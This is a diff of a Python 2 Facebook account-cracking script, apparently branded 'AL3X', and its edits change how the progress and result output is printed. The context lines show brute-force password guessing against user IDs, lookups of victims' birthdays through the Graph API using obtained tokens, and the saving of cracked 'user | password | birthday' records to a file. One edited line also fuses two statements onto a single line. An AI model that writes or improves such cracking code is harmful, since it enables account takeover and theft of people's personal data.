@@ -664,8 +664,7 @@ class crackmenu:
     def api(self, user, zkth):
         global loop
         (
-         sys.stdout.write('\033[1;97m[\033[1;92m*\033[1;97m] Cracking: %s/%s \xe2\x9e\xa4 OK:%s \xe2\x9e\xa4 CP:%s ' % (loop, len(self.id), len(ok), len(cp))),)
-        sys.stdout.flush()
+         sys.stdout.write('\r[\xe2\x9e\xa5] Cracking: %s/%s \xe2\x9e\xa4 OK:%s \xe2\x9e\xa4 CP:%s ' % (loop, len(self.id), len(ok), len(cp))),)        sys.stdout.flush()
         for pw in zkth:
             pw = pw.lower()
             try:
@@ -690,7 +689,7 @@ class crackmenu:
                     ak = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, loginz))
                     az = json.loads(ak.text)
                     dob = az['birthday'].replace('/', '-')
-                    print '[AL3X-CP] \033[1;31m%s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s      %s' % (K, user, pw, dob, N)
+                    print '\r[AL3X-CP] \033[1;31m%s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s      %s' % (K, user, pw, dob, N)
                     wrt = '%s | %s | %s' % (user, pw, dob)
                     cp.append(wrt)
                     open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
@@ -700,7 +699,7 @@ class crackmenu:
                 except:
                     pass
 
-                print '[AL3X-CP]\033[1;31m %s \xe2\x9e\xa4 %s                 %s' % (K, user, pw, N)
+                print '\r[AL3X-CP]\033[1;31m %s \xe2\x9e\xa4 %s                 %s' % (K, user, pw, N)
                 wrt = '%s | %s ' % (user, pw)
                 cp.append(wrt)
                 open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
